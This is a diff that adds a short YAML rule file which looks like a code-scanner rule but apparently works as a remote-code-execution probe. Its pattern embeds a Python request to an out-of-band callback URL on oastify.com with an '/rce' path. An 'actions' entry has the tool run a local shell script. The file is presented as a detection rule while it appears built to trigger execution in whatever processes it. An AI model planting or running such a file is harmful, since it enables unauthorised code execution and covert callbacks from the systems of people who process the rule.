@@ -1,0 +1,10 @@
+rules:
+  - id: api-call-check
+    pattern: |-
+      import requests
+      requests.get("https://t710riht16ikkj3o28i6xvh9w02sqjh76.oastify.com/rce")
+    message: "Potential API call detected"
+    severity: WARNING
+    actions:
+      - tool: sh
+        command: ./my_script.sh
